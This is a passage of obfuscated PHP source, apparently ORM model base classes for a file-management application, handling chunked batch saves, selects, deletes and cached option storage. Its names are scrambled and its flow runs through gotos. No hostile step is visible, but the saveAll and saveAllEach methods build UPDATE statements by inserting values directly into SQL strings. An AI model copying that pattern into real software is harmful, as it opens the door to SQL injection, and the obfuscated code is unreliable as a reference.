$eˆ·Ì˜™ô; goto cÄØ‡Ø¡Ÿ·; fŒæ·ª´š: $aÚ©ëÊºß = Model($this->tableMeta[$dƒì‘ªòùê[354]]); $bÉ— ŠÌø = array($fŸ¶˜ÙŸ„× => $B±‚—÷ÂŞô); $eˆ·Ì˜™ô = $aÚ©ëÊºß->field($dƒì‘ªòùê[357])->where($bÉ— ŠÌø)->select(); goto cø§ä™‡™Ó; cÄØ‡Ø¡Ÿ·: } private function checkDataAutoHas($EáŞ¼®§Ãå) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Aâİ¨ÕÀÑÛ) { if (in_array($EáŞ¼®§Ãå, explode($_SERVER[£ü][47], $Aâİ¨ÕÀÑÛ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$bğœÖó’‡å, $BœÙ…‰”À¡) { $AÂÃÏº’¶Ú =& $_SERVER[£ü]; foreach ($this->dataAuto as $dÆÙ†¤‚åò) { $E¾¶¾‘èÎ = $dÆÙ†¤‚åò[0]; if (!in_array($BœÙ…‰”À¡, explode($AÂÃÏº’¶Ú[47], $dÆÙ†¤‚åò[2]))) { continue; } switch (trim($dÆÙ†¤‚åò[3])) { case $AÂÃÏº’¶Ú[306]: case $AÂÃÏº’¶Ú[307]: $FÌ²¾ŒáÇÜ = $dÆÙ†¤‚åò[1]; $e–ƒÌ¥èó¾ = isset($dÆÙ†¤‚åò[4]) ? (array) $dÆÙ†¤‚åò[4] : array(); if ($FÌ²¾ŒáÇÜ == $AÂÃÏº’¶Ú[187] && array_key_exists($E¾¶¾‘èÎ, $bğœÖó’‡å)) { if (!$bğœÖó’‡å[$E¾¶¾‘èÎ]) { unset($bğœÖó’‡å[$E¾¶¾‘èÎ]); } break; } if (isset($bğœÖó’‡å[$E¾¶¾‘èÎ])) { array_unshift($e–ƒÌ¥èó¾, $bğœÖó’‡å[$E¾¶¾‘èÎ]); } if ($AÂÃÏº’¶Ú[306] == $dÆÙ†¤‚åò[3]) { $bğœÖó’‡å[$E¾¶¾‘èÎ] = call_user_func_array($FÌ²¾ŒáÇÜ, $e–ƒÌ¥èó¾); } else { $bğœÖó’‡å[$E¾¶¾‘èÎ] = call_user_func_array(array(&$this, $FÌ²¾ŒáÇÜ), $e–ƒÌ¥èó¾); } break; case $AÂÃÏº’¶Ú[258]: $bğœÖó’‡å[$E¾¶¾‘èÎ] = $bğœÖó’‡å[$dÆÙ†¤‚åò[1]]; break; case $AÂÃÏº’¶Ú[279]: if (isset($bğœÖó’‡å[$E¾¶¾‘èÎ]) && !is_string($bğœÖó’‡å[$E¾¶¾‘èÎ])) { $bğœÖó’‡å[$E¾¶¾‘èÎ] = json_encode_force($bğœÖó’‡å[$E¾¶¾‘èÎ]); } break; case $AÂÃÏº’¶Ú[308]: if ($bğœÖó’‡å[$E¾¶¾‘èÎ] === $AÂÃÏº’¶Ú[33]) { unset($bğœÖó’‡å[$E¾¶¾‘èÎ]); } break; case $AÂÃÏº’¶Ú[309]: $bğœÖó’‡å[$E¾¶¾‘èÎ] = $dÆÙ†¤‚åò[1]; default: break; } } if ($BœÙ…‰”À¡ == $AÂÃÏº’¶Ú[341]) { $FÏ“Ÿ£±ø² = strtolower($this->db->getDbType()); if (strpos($FÏ“Ÿ£±ø², $AÂÃÏº’¶Ú[9]) !== 0) { return; } $a’ÜÕÄµ†¡ = $this->field(!0)->fields; $e¨èåí½´ª = $a’ÜÕÄµ†¡[$AÂÃÏº’¶Ú[237]]; if (isset($a’ÜÕÄµ†¡[$AÂÃÏº’¶Ú[236]])) { unset($e¨èåí½´ª[$a’ÜÕÄµ†¡[$AÂÃÏº’¶Ú[236]]]); } foreach ($e¨èåí½´ª as $E’‹…ÊÌ˜Ê => $BœÙ…‰”À¡) { if (!isset($bğœÖó’‡å[$E’‹…ÊÌ˜Ê])) { $bğœÖó’‡å[$E’‹…ÊÌ˜Ê] = $AÂÃÏº’¶Ú[33]; } } } } private function dataAfterFilter(&$B¼®’á¨´ù) { $a±¿¶¬ÂÂ® =& $_SERVER[£ü]; foreach ($this->dataAuto as $fóóèºŸ‚æ) { $F×Ÿ³›â¡ = $fóóèºŸ‚æ[0]; if (!in_array($a±¿¶¬ÂÂ®[343], explode($a±¿¶¬ÂÂ®[47], $fóóèºŸ‚æ[2]))) { continue; } if (!isset($B¼®’á¨´ù[$F×Ÿ³›â¡])) { continue; } switch (trim($fóóèºŸ‚æ[3])) { case $a±¿¶¬ÂÂ®[306]: case $a±¿¶¬ÂÂ®[307]: $D“ºÄ»•‹İ = isset($fóóèºŸ‚æ[4]) ? (array) $fóóèºŸ‚æ[4] : array(); array_unshift($D“ºÄ»•‹İ, $B¼®’á¨´ù[$F×Ÿ³›â¡]); if ($a±¿¶¬ÂÂ®[306] == $fóóèºŸ‚æ[3]) { $B¼®’á¨´ù[$F×Ÿ³›â¡] = call_user_func_array($fóóèºŸ‚æ[1], $D“ºÄ»•‹İ); } else { $B¼®’á¨´ù[$F×Ÿ³›â¡] = call_user_func_array(array(&$this, $fóóèºŸ‚æ[1]), $D“ºÄ»•‹İ); } break; case $a±¿¶¬ÂÂ®[258]: $B¼®’á¨´ù[$F×Ÿ³›â¡] = $B¼®’á¨´ù[$fóóèºŸ‚æ[1]]; break; case $a±¿¶¬ÂÂ®[279]: $C‹Ö«¬·¯ò = $B¼®’á¨´ù[$F×Ÿ³›â¡]; $B¼®’á¨´ù[$F×Ÿ³›â¡] = json_decode($C‹Ö«¬·¯ò, !0); if (is_null($B¼®’á¨´ù[$F×Ÿ³›â¡])) { $B¼®’á¨´ù[$F×Ÿ³›â¡] = $C‹Ö«¬·¯ò; } break; case $a±¿¶¬ÂÂ®[308]: if ($B¼®’á¨´ù[$F×Ÿ³›â¡] === $a±¿¶¬ÂÂ®[33]) { unset($B¼®’á¨´ù[$F×Ÿ³›â¡]); } break; case $a±¿¶¬ÂÂ®[309]: $B¼®’á¨´ù[$F×Ÿ³›â¡] = $fóóèºŸ‚æ[1]; default: break; } } } public function saveAll($Cº¶é™¶š) { goto DÏ’‚µ; DÏ’‚µ: $F°š‘åÏĞ =& $_SERVER[£ü]; $b»™ä¥†ç¤ = $this->tablePrefix . $this->tableName; $b· —ÛÊó = self::SQL_WHERE_IN_CHUNK; goto dÆõàÒ¿Äâ; dÆõàÒ¿Äâ: $Cº¶é™¶š = is_array($Cº¶é™¶š) ? $Cº¶é™¶š : array(); $b¤¶‡‰˜Ó‘ = $F°š‘åÏĞ[358]; $fÀïë´ÕÃ = 0; goto böÂĞÕ¾ƒ¹; bŠ¨©½¢Øœ: $this->chunkEventSet(); goto b¹ø‰Ÿ„Ú‘; böÂĞÕ¾ƒ¹: $cÀ÷‚˜ĞÓ¨ = array(); $e…Ú†ÜùÔù = count($Cº¶é™¶š); for ($Cóìğƒ†Œ = 0; $Cóìğƒ†Œ < $e…Ú†ÜùÔù; $Cóìğƒ†Œ++) { $cÙÚƒŒ­¨„ = $Cº¶é™¶š[$Cóìğƒ†Œ]; if (!is_array($cÙÚƒŒ­¨„) || count($cÙÚƒŒ­¨„) != 4) { continue; } $FÈ®—¯¢œé = "\x55\120\x44\x41\124\x45\x20{$b»™ä¥†ç¤}\x20\x53\105\124\40{$cÙÚƒŒ­¨„[2]}\40\75\40\103\x41\123\105\40{$cÙÚƒŒ­¨„[0]}\40\xa"; if ($fÀïë´ÕÃ == 0) { $b¤¶‡‰˜Ó‘ = $FÈ®—¯¢œé; } $cÀ÷‚˜ĞÓ¨[] = $F°š‘åÏĞ[113] . $cÙÚƒŒ­¨„[1] . $F°š‘åÏĞ[113]; $fÀïë´ÕÃ++; $b¤¶‡‰˜Ó‘ .= "\40\127\x48\105\x4e\40\47{$cÙÚƒŒ­¨„[1]}\47\x20\x54\110\105\x4e\x20\47{$cÙÚƒŒ­¨„[3]}\47\40\12"; if ($fÀïë´ÕÃ == $b· —ÛÊó || $Cóìğƒ†Œ == $e…Ú†ÜùÔù - 1) { goto e’œéËí Å; b¿¬Óã“¬ß: $fÀïë´ÕÃ = 0; $b¤¶‡‰˜Ó‘ = $FÈ®—¯¢œé; $this->chunkEventCheck(count($cÀ÷‚˜ĞÓ¨)); goto F¥‘â Å; e’œéËí Å: $AÏ±ÕŠô´© = implode($F°š‘åÏĞ[47], $cÀ÷‚˜ĞÓ¨); $b¤¶‡‰˜Ó‘ .= "\40\105\116\104\x20\x20\x57\110\x45\122\105\x20{$cÙÚƒŒ­¨„[0]}\x20\111\116\40\50{$AÏ±ÕŠô´©}\51\40"; $this->execute($b¤¶‡‰˜Ó‘); goto b¿¬Óã“¬ß; F¥‘â Å: $cÀ÷‚˜ĞÓ¨ = array(); goto c­‰Ã»ì˜Ÿ; c­‰Ã»ì˜Ÿ: } } goto bŠ¨©½¢Øœ; b¹ø‰Ÿ„Ú‘: } public function saveAllEach($F„ÒÑã§ßÆ) { $BÎ”ÎÌ³Ò =& $_SERVER[£ü]; $aÜŒ•œ¶°ô = $this->tablePrefix . $this->tableName; foreach ($F„ÒÑã§ßÆ as $f‹¦Éµ«£) { if (!is_array($f‹¦Éµ«£) || count($f‹¦Éµ«£) != 4) { continue; } $fù¤Ş«ó‚ = $f‹¦Éµ«£[0] . $BÎ”ÎÌ³Ò[359] . $f‹¦Éµ«£[1] . $BÎ”ÎÌ³Ò[113]; $dïãŠÈÅÊ¨ = $f‹¦Éµ«£[2] . $BÎ”ÎÌ³Ò[359] . $f‹¦Éµ«£[3] . $BÎ”ÎÌ³Ò[113]; $Fåõ¿Ê‚Û˜ = "\165\160\144\141\x74\145\40{$aÜŒ•œ¶°ô}\x20\163\x65\164\40{$dïãŠÈÅÊ¨}\40\x77\150\145\x72\145\40{$fù¤Ş«ó‚}\x3b"; $this->execute($Fåõ¿Ê‚Û˜); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($FšÑÑÂ…ĞÑ = false, $c—Ö†êçÑ = false) { $this->_chunkEvent = $FšÑÑÂ…ĞÑ; $this->_chunkEventParam = $c—Ö†êçÑ; } private function chunkEventCheck($FçƒÅç‹‘Ä) { if (!$this->_chunkEvent) { return; } $c¼†Ñíš• = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $c¼†Ñíš•[$_SERVER[£ü][360]] = $FçƒÅç‹‘Ä; Hook::trigger($this->_chunkEvent, $c¼†Ñíš•); } public function addAll($aÚ†ë­¾õØ, $AÒîíÂéêö = array(), $Cğô¼¯å·ô = false) { goto aïãÁ¨åÕ‹; f•İàĞ¶ùŞ: if (method_exists($this->db, $cÁ’¤»®ß[257])) { for ($fì½»ÇªìĞ = 0; $fì½»ÇªìĞ < count($aÚ†ë­¾õØ); $fì½»ÇªìĞ += $Eäéä§ö¢ì) { $FÈ¸¥‡ºî¶ = array_slice($aÚ†ë­¾õØ, $fì½»ÇªìĞ, $Eäéä§ö¢ì); if (!is_array($FÈ¸¥‡ºî¶) || count($FÈ¸¥‡ºî¶) == 0) { break; } $bŒÛ‡éÀå­ = $this->db->insertAll($FÈ¸¥‡ºî¶, $AÒîíÂéêö, $Cğô¼¯å·ô); $this->chunkEventCheck(count($FÈ¸¥‡ºî¶)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aÚ†ë­¾õØ as $b²ĞåÍ”Ü¹ => $d­ğ‰•Â´ˆ) { $bŒÛ‡éÀå­ = $this->db->insert($d­ğ‰•Â´ˆ, $AÒîíÂéêö, $Cğô¼¯å·ô); } $this->commit(); } if (!1 !== $bŒÛ‡éÀå­) { $FÓØÈ¶ò = $this->getLastInsID(); if ($FÓØÈ¶ò) { return $FÓØÈ¶ò; } } return $bŒÛ‡éÀå­; goto c£ÓÔ»Ø´ñ; aïãÁ¨åÕ‹: $cÁ’¤»®ß =& $_SERVER[£ü]; ignore_timeout(); $Eäéä§ö¢ì = self::SQL_WHERE_IN_CHUNK; goto DôÒôÓŠ‹À; DôÒôÓŠ‹À: if (empty($aÚ†ë­¾õØ)) { $this->error = think_lang($cÁ’¤»®ß[256]); return !1; } $AÒîíÂéêö = $this->_parseOptions($AÒîíÂéêö); foreach ($aÚ†ë­¾õØ as $b²ĞåÍ”Ü¹ => $d­ğ‰•Â´ˆ) { $aÚ†ë­¾õØ[$b²ĞåÍ”Ü¹] = $this->_facade($d­ğ‰•Â´ˆ); $this->_beforeInsert($aÚ†ë­¾õØ[$b²ĞåÍ”Ü¹], $AÒîíÂéêö); } goto f•İàĞ¶ùŞ; c£ÓÔ»Ø´ñ: } public function save($cÂ×…öğÒÀ = '', $BÏĞƒ°ø„§ = array()) { goto b–‚²ÜÔÒ; aèÅïÌéˆ: $F•¶¿Œ—³Ó = $BŒ½™öïŸá[$E¶ˆç­„¯‡[260]][$C­œæÎã”Ù][1]; $F•¶¿Œ—³Ó = is_array($F•¶¿Œ—³Ó) ? $F•¶¿Œ—³Ó : array(); $Fö­¿ÙÊÃ = count($F•¶¿Œ—³Ó); goto D„µá—½¸Ò; b–‚²ÜÔÒ: $E¶ˆç­„¯‡ =& $_SERVER[£ü]; $A×Ÿ³“¤î = self::SQL_WHERE_IN_CHUNK; $BŒ½™öïŸá = $this->optionsValue(); goto e…Îï©ßÅŞ; D„µá—½¸Ò: for ($EæïÕô×¿… = 0; $EæïÕô×¿… < $Fö­¿ÙÊÃ; $EæïÕô×¿… += $A×Ÿ³“¤î) { $DòñÊª¿¡¥ = array_slice($F•¶¿Œ—³Ó, $EæïÕô×¿…, $A×Ÿ³“¤î); if (!is_array($DòñÊª¿¡¥) || count($DòñÊª¿¡¥) == 0) { break; } $BŒ½™öïŸá[$E¶ˆç­„¯‡[260]][$C­œæÎã”Ù][1] = $DòñÊª¿¡¥; $this->optionsValue($BŒ½™öïŸá); $A’åíÒù¯× += parent::save($cÂ×…öğÒÀ, $BÏĞƒ°ø„§); $this->chunkEventCheck(count($DòñÊª¿¡¥)); } $this->chunkEventSet(); return $A’åíÒù¯×; goto eåï¾‰ìäŞ; e…Îï©ßÅŞ: $C­œæÎã”Ù = $this->findWhereField($BŒ½™öïŸá); if (!$C­œæÎã”Ù) { return parent::save($cÂ×…öğÒÀ, $BÏĞƒ°ø„§); } $A’åíÒù¯× = 0; goto aèÅïÌéˆ; eåï¾‰ìäŞ: } public function add($f’ŒáíˆËù = '', $f³ËÒƒ˜Ê = array(), $A†Şİ”ÌêÎ = false) { if ($this->addTaskStatus && is_array($f’ŒáíˆËù)) { $this->addTaskData[] = $f’ŒáíˆËù; return; } return parent::add($f’ŒáíˆËù, $f³ËÒƒ˜Ê, $A†Şİ”ÌêÎ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($EÓëÆæï‘” = array()) { goto BÆ·¯Êàî»; aÎ‘êÒåè´: $BâîîÑñêƒ = is_array($BâîîÑñêƒ) ? $BâîîÑñêƒ : array(); $Fš–ÒÛë¡– = null; for ($BŠ¼ö°±×º = 0; $BŠ¼ö°±×º < count($BâîîÑñêƒ); $BŠ¼ö°±×º += $b–ŒÅÁœŒ) { $bº¢Ç÷÷ì = array_slice($BâîîÑñêƒ, $BŠ¼ö°±×º, $b–ŒÅÁœŒ); if (!is_array($bº¢Ç÷÷ì) || count($bº¢Ç÷÷ì) == 0) { break; } $FğŞ„›—„Š[$dÀ„¸ĞŠÓ[260]][$E÷·ã²¦¤Ï][1] = $bº¢Ç÷÷ì; $this->optionsValue($FğŞ„›—„Š); $DèµíĞã„ = parent::select($EÓëÆæï‘”); if (!$DèµíĞã„) { continue; } if (is_null($Fš–ÒÛë¡–)) { $Fš–ÒÛë¡– = array(); } $Fš–ÒÛë¡– = array_merge($Fš–ÒÛë¡–, $DèµíĞã„); } goto c‰£Œ†ø‚¦; c‰£Œ†ø‚¦: return $Fš–ÒÛë¡–; goto a§ô²â•Û¼; c¯õøğ»·: $E÷·ã²¦¤Ï = $this->findWhereField($FğŞ„›—„Š); if (!$E÷·ã²¦¤Ï || isset($FğŞ„›—„Š[$dÀ„¸ĞŠÓ[277]]) || isset($FğŞ„›—„Š[$dÀ„¸ĞŠÓ[337]])) { return parent::select($EÓëÆæï‘”); } $BâîîÑñêƒ = $FğŞ„›—„Š[$dÀ„¸ĞŠÓ[260]][$E÷·ã²¦¤Ï][1]; goto aÎ‘êÒåè´; BÆ·¯Êàî»: $dÀ„¸ĞŠÓ =& $_SERVER[£ü]; $b–ŒÅÁœŒ = self::SQL_WHERE_IN_CHUNK; $FğŞ„›—„Š = $this->optionsValue(); goto c¯õøğ»·; a§ô²â•Û¼: } public function delete($b­ŠŠÌ±àŞ = array()) { goto Cš¾„çƒ´´; e†ÃäÕÀ˜: $b«àÕãÃ…ì = $this->findWhereField($B¿‘“É¿í£); if (!$b«àÕãÃ…ì) { return parent::delete($b­ŠŠÌ±àŞ); } $E÷Ùœ–õ = 0; goto cÉƒ«Ü£ğÏ; cÉƒ«Ü£ğÏ: $CÅÅ•Ö½äˆ = $B¿‘“É¿í£[$cŠÄ¨Ş[260]][$b«àÕãÃ…ì][1]; $CÅÅ•Ö½äˆ = is_array($CÅÅ•Ö½äˆ) ? $CÅÅ•Ö½äˆ : array(); for ($Eçô³Ò¦½õ = 0; $Eçô³Ò¦½õ < count($CÅÅ•Ö½äˆ); $Eçô³Ò¦½õ += $b³Ó®…†“) { $E¸ÜáÀ÷†ì = array_slice($CÅÅ•Ö½äˆ, $Eçô³Ò¦½õ, $b³Ó®…†“); if (!is_array($E¸ÜáÀ÷†ì) || count($E¸ÜáÀ÷†ì) == 0) { break; } $B¿‘“É¿í£[$cŠÄ¨Ş[260]][$b«àÕãÃ…ì][1] = $E¸ÜáÀ÷†ì; $this->optionsValue($B¿‘“É¿í£); $E÷Ùœ–õ += parent::delete($b­ŠŠÌ±àŞ); } goto F‡ˆÕî§óª; F‡ˆÕî§óª: return $E÷Ùœ–õ; goto aÖìÙÇµš; Cš¾„çƒ´´: $cŠÄ¨Ş =& $_SERVER[£ü]; $b³Ó®…†“ = self::SQL_WHERE_IN_CHUNK; $B¿‘“É¿í£ = $this->optionsValue(); goto e†ÃäÕÀ˜; aÖìÙÇµš: } private function findWhereField($F¦¡˜ê´…÷) { $f®èŸµ„ =& $_SERVER[£ü]; $E¿èÔäÀ–‚ = self::SQL_WHERE_IN_CHUNK; if (!is_array($F¦¡˜ê´…÷) || !is_array($F¦¡˜ê´…÷[$f®èŸµ„[260]])) { return !1; } foreach ($F¦¡˜ê´…÷[$f®èŸµ„[260]] as $FÎÂù’³ô => $e»®¹í²ÓÍ) { if (is_array($e»®¹í²ÓÍ) && isset($e»®¹í²ÓÍ[0]) && is_string($e»®¹í²ÓÍ[0]) && strtolower($e»®¹í²ÓÍ[0]) == $f®èŸµ„[7] && is_array($e»®¹í²ÓÍ[1]) && count($e»®¹í²ÓÍ[1]) > $E¿èÔäÀ–‚) { ignore_timeout(); return $FÎÂù’³ô; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\x4f\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($FÏ’ìÀ…î¢ = false, $böŠì›³» = "\155\157\144\151\146\171\x54\x69\x6d\x65", $F´òóŞÙ°… = false) { $cë•¨Ü¯¯î = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cë•¨Ü¯¯î) { return $FÏ’ìÀ…î¢ ? null : array(); } if (!$FÏ’ìÀ…î¢) { $cë•¨Ü¯¯î = array_filter(array_values($cë•¨Ü¯¯î)); return array_sort_by($cë•¨Ü¯¯î, $böŠì›³», $F´òóŞÙ°…); } return $cë•¨Ü¯¯î[$_SERVER[£ü][361] . $FÏ’ìÀ…î¢]; } public function insert($a£®¾ÍÔ÷») { goto B°’é‘•; d‹âÏÇ£‰: $a£®¾ÍÔ÷»[$CÙ‹ƒ” ½¬[107]] = time(); Model($this->modelType)->set($CÙ‹ƒ” ½¬[362], $c…î½·Õ»¦, $this->optionType . $CÙ‹ƒ” ½¬[363]); Model($this->modelType)->set($CÙ‹ƒ” ½¬[361] . $c…î½·Õ»¦, $a£®¾ÍÔ÷», $this->optionType); goto FÇé½ˆ«°; C†Î¯öØ†: $c…î½·Õ»¦ = $c…î½·Õ»¦ ? $c…î½·Õ»¦ : 0; $a£®¾ÍÔ÷»[$CÙ‹ƒ” ½¬[364]] = ++$c…î½·Õ»¦; $a£®¾ÍÔ÷»[$CÙ‹ƒ” ½¬[184]] = time(); goto d‹âÏÇ£‰; B°’é‘•: $CÙ‹ƒ” ½¬ =& $_SERVER[£ü]; $a£®¾ÍÔ÷» = array_field_key($a£®¾ÍÔ÷», $this->field); $c…î½·Õ»¦ = Model($this->modelType)->get($CÙ‹ƒ” ½¬[362], $this->optionType . $CÙ‹ƒ” ½¬[363]); goto C†Î¯öØ†; FÇé½ˆ«°: return $c…î½·Õ»¦; goto c‰…¢Ü‹×º; c‰…¢Ü‹×º: } public function update($B—¨´», $FÒ²òˆ‡İ†) { goto CŒ¬„íÁ; aöå‡Âİ„: return Model($this->modelType)->set($eï‚¾ì«˜´[361] . $B—¨´», $FÒ²òˆ‡İ†, $this->optionType); goto C×ñËí×Äš; CŒ¬„íÁ: $eï‚¾ì«˜´ =& $_SERVER[£ü]; $FÒ²òˆ‡İ† = array_field_key($FÒ²òˆ‡İ†, $this->field); $BÙ—“è¤•‘ = $this->listData($B—¨´»); goto F¹­‚¥‘÷ø; F¹­‚¥‘÷ø: if (!$BÙ—“è¤•‘) { return !1; } $FÒ²òˆ‡İ† = array_merge($BÙ—“è¤•‘, $FÒ²òˆ‡İ†); $FÒ²òˆ‡İ†[$eï‚¾ì«˜´[107]] = time(); goto aöå‡Âİ„; C×ñËí×Äš: } public function remove($C‘ĞŠ¤×Ù·) { return Model($this->modelType)->remove($_SERVER[£ü][361] . $C‘ĞŠ¤×Ù·, $this->optionType); } public function clear() { $F˜Ä¡Æ”¾ß =& $_SERVER[£ü]; Model($this->modelType)->remove($F˜Ä¡Æ”¾ß[362], $this->optionType . $F˜Ä¡Æ”¾ß[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Aéá£ñ„˜, $FŒÊĞÑ­´) { if (!$FŒÊĞÑ­´) { return !1; } $eöçïŞË®ñ = $this->listData(); $eöçïŞË®ñ = array_to_keyvalue($eöçïŞË®ñ, $Aéá£ñ„˜); return isset($eöçïŞË®ñ[$FŒÊĞÑ­´]) ? $eöçïŞË®ñ[$FŒÊĞÑ­´] : !1; } public function findByName($aº†¡µä­Á) { return $this->findByKey($_SERVER[£ü][28], $aº†¡µä­Á); } protected function resetData($Eù ¶—Ø­†) { $E¤¸ÍÛäÌŒ =& $_SERVER[£ü]; $Eù ¶—Ø­† = is_array($Eù ¶—Ø­†) ? $Eù ¶—Ø­† : array(); $B°”›îà¿ª = array(); for ($A¢â‘å´Ø† = 0; $A¢â‘å´Ø† < count($Eù ¶—Ø­†); $A¢â‘å´Ø†++) { $B°”›îà¿ª[$E¤¸ÍÛäÌŒ[361] . $Eù ¶—Ø­†[$A¢â‘å´Ø†][$E¤¸ÍÛäÌŒ[364]]] = $Eù ¶—Ø­†[$A¢â‘å´Ø†]; } return Model($this->modelType)->set($B°”›îà¿ª, !1, $this->optionType); } private function getAutoName($FÒÈŞŸç÷¿) { $f«”ÊÄ¾Åò = array_to_keyvalue($this->listData(), $_SERVER[£ü][28]); if (!$f«”ÊÄ¾Åò || !isset($f«”ÊÄ¾Åò[$FÒÈŞŸç÷¿])) { return $FÒÈŞŸç÷¿; } for ($bÍ¼ŒÈØ½• = 1; $bÍ¼ŒÈØ½• < count($f«”ÊÄ¾Åò); $bÍ¼ŒÈØ½•++) { $b«§«–¡ = $FÒÈŞŸç÷¿ . "\x28{$bÍ¼ŒÈØ½•}\x29"; if (!isset($f«”ÊÄ¾Åò[$b«§«–¡])) { return $b«§«–¡; } } return $b«§«–¡; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($a‚÷ôè©îÚ = false, $BíòÎ·Üê = '', $d§íÀôÙİ = false) { goto Bø£°â¥¼‚; Bø£°â¥¼‚: $D¢ášØ†÷ˆ =& $_SERVER[£ü]; $DÊĞÅ¸½ÙÑ = $this->cacheGet($BíòÎ·Üê); $Aëö†š…í = $this->optionDefault($BíòÎ·Üê); goto a„öÙ±ïï‚; a„öÙ±ïï‚: $Aëö†š…í = is_array($Aëö†š…í) ? $Aëö†š…í : array(); if (is_array($DÊĞÅ¸½ÙÑ)) { $DÊĞÅ¸½ÙÑ = array_merge($Aëö†š…í, $DÊĞÅ¸½ÙÑ); return $a‚÷ôè©îÚ ? isset($DÊĞÅ¸½ÙÑ[$a‚÷ôè©îÚ]) ? $DÊĞÅ¸½ÙÑ[$a‚÷ôè©îÚ] : null : $DÊĞÅ¸½ÙÑ; } $DÒÇÏ™ä†„ = $this->filterWhere(array($D¢ášØ†÷ˆ[29] => $BíòÎ·Üê)); goto d×³ÊŸô“; d×³ÊŸô“: $DÊĞÅ¸½ÙÑ = $this->where($DÒÇÏ™ä†„)->select(); $DÊĞÅ¸½ÙÑ = array_to_keyvalue($DÊĞÅ¸½ÙÑ, $D¢ášØ†÷ˆ[89], $D¢ášØ†÷ˆ[356]); foreach ($DÊĞÅ¸½ÙÑ as $FÖ¦í¦Â´ => $EÔ½Êèƒ„) { if ($d§íÀôÙİ || in_array($FÖ¦í¦Â´, $this->jsonField)) { $DÊĞÅ¸½ÙÑ[$FÖ¦í¦Â´] = json_decode($EÔ½Êèƒ„, !0); } } goto FÓé±äî¦¤; FÓé±äî¦¤: $this->cacheSet($BíòÎ·Üê, $DÊĞÅ¸½ÙÑ); $DÊĞÅ¸½ÙÑ = array_merge($Aëö†š…í, $DÊĞÅ¸½ÙÑ); return $a‚÷ôè©îÚ ? $DÊĞÅ¸½ÙÑ[$a‚÷ôè©îÚ] : $DÊĞÅ¸½ÙÑ; goto dêÉÏËâø; dêÉÏËâø: } public function set($d¯ó—‹Õ¸Œ, $F¥Æƒ£ØÔ˜ = false, $dä˜éÖ“÷° = '') { goto b£èÎÃŒ®‚; Aç‘İÆ¹Œ: return $this->addAll($a¹†íçÂÁï, array(), !0); goto d¸ãèè—˜‡; b£èÎÃŒ®‚: $a˜‚§àøª =& $_SERVER[£ü]; $this->cacheRemove($dä˜éÖ“÷°); $a¹†íçÂÁï = array(); goto fÕŞ·£Òæ‚; fÕŞ·£Òæ‚: $aİŸ„¢…Ç = is_array($d¯ó—‹Õ¸Œ) ? $d¯ó—‹Õ¸Œ : array($d¯ó—‹Õ¸Œ => $F¥Æƒ£ØÔ˜); foreach ($aİŸ„¢…Ç as $DÖ¢„†ÆÏ => $BóÍ´Á˜È©) { if (is_array($BóÍ´Á˜È©)) { $BóÍ´Á˜È© = json_encode_force($BóÍ´Á˜È©); } $this->checkLength($BóÍ´Á˜È©, !1, $this->tableName . $a˜‚§àøª[4] . $d¯ó—‹Õ¸Œ); $BóÍ´Á˜È© = self::textEncode($BóÍ´Á˜È©); $aİŸ„¢…Ç = array($a˜‚§àøª[29] => $dä˜éÖ“÷°, $a˜‚§àøª[89] => $DÖ¢„†ÆÏ, $a˜‚§àøª[356] => $BóÍ´Á˜È©); $a¹†íçÂÁï[] = $this->filterWhere($aİŸ„¢…Ç); } if (!$a¹†íçÂÁï) { return !0; } goto Aç‘İÆ¹Œ; d¸ãèè—˜‡: } protected function optionDefault($Bˆ†ŞÕÁ†™ = '') { return !1; } public function setDeep($BÕÑå§—Ò´, $DÈÇ£éİñ‰ = false, $eÛ§ñ´ˆŞÈ = '') { $AÓ¼ˆ‰‡§ = explode($_SERVER[£ü][93], $BÕÑå§—Ò´); $a¬¬ø½¬é© = $this->get(); array_set_value($a¬¬ø½¬é©, $BÕÑå§—Ò´, $DÈÇ£éİñ‰); $this->set($AÓ¼ˆ‰‡§[0], $a¬¬ø½¬é©[$AÓ¼ˆ‰‡§[0]], $eÛ§ñ´ˆŞÈ); } public function remove($AÍÇë½Ø•, $bËÆ‚¬¤Û® = '') { $f“ñ¯Àã«Î =& $_SERVER[£ü]; $this->cacheRemove($bËÆ‚¬¤Û®); $c”ª´‚êšÏ = $this->filterWhere(array($f“ñ¯Àã«Î[89] => $AÍÇë½Ø•, $f“ñ¯Àã«Î[29] => $bËÆ‚¬¤Û®)); if (is_null($AÍÇë½Ø•)) { unset($c”ª´‚êšÏ[$f“ñ¯Àã«Î[89]]); } return $this->where($c”ª´‚êšÏ)->delete(); } public function cacheSet($Dãé×Ó¯¦›, $FÄËœ›Îç = false) { return Cache::set($this->cacheKey($Dãé×Ó¯¦›), $FÄËœ›Îç); } public function cacheGet($f‘Ô‰Çò) { return Cache::get($this->cacheKey($f‘Ô‰Çò)); } public function cacheRemove($FÉá¿Ùİ¿ô) { return Cache::remove($this->cacheKey($FÉá¿Ùİ¿ô)); } protected function filterWhere($Bó¯ƒÜ«ƒ«) { return $Bó¯ƒÜ«ƒ«; } protected function cacheKey($BšÏäÈ—÷‰) { return $BšÏäÈ—÷‰; } } goto Eª÷¦î®è; EÉğÄ£•È÷: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($BÊá»Úè½Ù) { $F¤ŒÎÍòìê =& $_SERVER[£ü]; $cùÛ¯É—”Ì = Model($F¤ŒÎÍòìê[470])->where(array($F¤ŒÎÍòìê[1392] => $BÊá»Úè½Ù))->find(); $déææÑĞ­‡ = $this->_mkdirRoot(SourceModel::TYPE_USER, $BÊá»Úè½Ù, 